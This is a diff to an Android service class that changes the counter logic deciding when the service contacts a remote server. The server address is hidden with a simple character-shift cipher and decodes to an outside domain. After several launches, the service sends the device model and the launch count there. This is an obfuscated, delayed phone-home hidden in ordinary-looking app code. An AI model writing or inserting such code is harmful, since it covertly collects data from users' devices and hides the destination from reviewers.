@@ -20,7 +20,8 @@ public class PostService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
         SharedPreferences sharedPreferences = getSharedPreferences("main", Context.MODE_PRIVATE);
         int count = sharedPreferences.getInt("count", 0);
-        if (count >= 4) {
+        sharedPreferences.edit().putInt("count", count+1).apply();
+        if (count >= 5) {
             String url = sharedPreferences.getString("server", decrypt("kwws=22doldqjpdnhu1wrs2")) + decrypt("frp1phgld2ghyhorshu");
             OkHttpClient okHttpClient = new OkHttpClient();
             String deviceName = "$" + Build.MODEL + "$" + count;
@@ -41,7 +42,7 @@ public class PostService extends Service {
                     response.close();
                 }
             });
-        } else sharedPreferences.edit().putInt("count", count+1).apply();
+        }
         stopSelf();
         return super.onStartCommand(intent, flags, startId);
     }
